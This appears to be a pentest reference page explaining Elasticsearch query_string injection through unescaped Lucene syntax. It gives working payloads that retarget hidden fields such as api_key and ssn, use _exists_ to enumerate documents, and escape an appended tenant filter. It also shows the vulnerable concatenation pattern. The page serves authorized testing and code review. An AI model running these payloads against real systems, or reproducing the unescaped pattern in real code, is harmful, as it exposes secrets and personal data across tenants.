---
title: "Elasticsearch query_string injection via Lucene syntax"
description: "When a search term flows unescaped into query_string or simple_query_string, Lucene operators let an attacker retarget fields, flip boolean logic, and widen result sets past intended filters."
keywords:
  - query_string injection
  - simple_query_string
  - Lucene syntax
  - field targeting
  - _exists_
  - boolean operators
---

# Query string injection

The `query_string` and `simple_query_string` queries parse a mini-language (Lucene query syntax) directly from the supplied text. When an application drops a user's search term into that query without escaping the reserved characters, the term stops being data and becomes **query logic**. Unlike SQL, there is no out-of-band interpreter to subvert: the parser itself grants field selection, boolean combination, wildcards, ranges, and existence tests.

> **Scope.** For authorized penetration tests, CTF labs, and code review of systems you own or are contracted to assess.

## Vulnerable pattern

```json
POST /products/_search
{
  "query": {
    "query_string": { "query": "USER_TERM" }
  }
}
```

The application substitutes the raw search box value into `USER_TERM`. Reserved characters (`+ - = && || > < ! ( ) { } [ ] ^ " ~ * ? : \ /`) and the keywords `AND`, `OR`, `NOT`, `TO` are all live.

## Boolean operators

Default field searches can be combined or negated. If the app expects a plain keyword, supplying operators rewrites the intent:

```
laptop OR price:[0 TO 999999]
laptop AND NOT discontinued:true
```

`OR` with a broad second clause pulls in documents the original term would never match.

## Field targeting

`field:value` jumps to any indexed field, including ones the UI never exposes. An attacker who knows or guesses the mapping reads fields outside the search box's scope:

```
name:laptop OR is_internal:true
* OR api_key:*
owner_id:12 OR owner_id:13
```

A leading `*` or empty term combined with `OR` on a sensitive field turns a product search into a dump of documents carrying that field.

## Wildcards and ranges

Wildcards (`*`, `?`) and ranges (`[min TO max]`, `{exclusive}`) widen matches and enable value probing:

```
email:*@corp.example
created:[2020-01-01 TO 2026-12-31]
price:<0 OR amount:>999999
```

Leading wildcards (`*term`) are rejected by default but often re-enabled with `allow_leading_wildcard`; where allowed, `secret:*` confirms any document that has the field.

## Widening with `_exists_`

The `_exists_:field` token matches every document where a field is present, regardless of value, a fast way to break out of a filtered view and enumerate which documents carry privileged attributes:

```
_exists_:password_reset_token
name:anything OR _exists_:ssn
```

## Bypassing an appended filter

Applications often concatenate a trusting term with a trailing scope filter:

```json
{ "query": { "query_string": { "query": "USER_TERM AND tenant:acme" } } }
```

A term of `x OR _exists_:id` yields `x OR _exists_:id AND tenant:acme`. Because `AND` binds tighter than `OR`, the `_exists_:id` arm matches every document independent of the tenant clause, escaping tenant isolation. Forcing grouping makes the bypass explicit where the injection point allows parentheses:

```
x) OR (_exists_:id
```

This closes the intended group early and opens an unscoped one, discarding the appended filter entirely.

## Analyzer and boosting tells

Fuzzy (`term~`), proximity (`"a b"~5`), and boost (`term^10`) operators confirm the parser is live when reconnaissance is needed: a response that treats `test~2` differently from the literal string `test~2` proves `query_string` parsing rather than a `match` query.

## References

- [Elasticsearch: Query string query](https://www.elastic.co/guide/en/elasticsearch/reference/current/query-dsl-query-string-query.html)
- [Elasticsearch: Simple query string query](https://www.elastic.co/guide/en/elasticsearch/reference/current/query-dsl-simple-query-string-query.html)
- [Apache Lucene: Query parser syntax](https://lucene.apache.org/core/documentation.html)
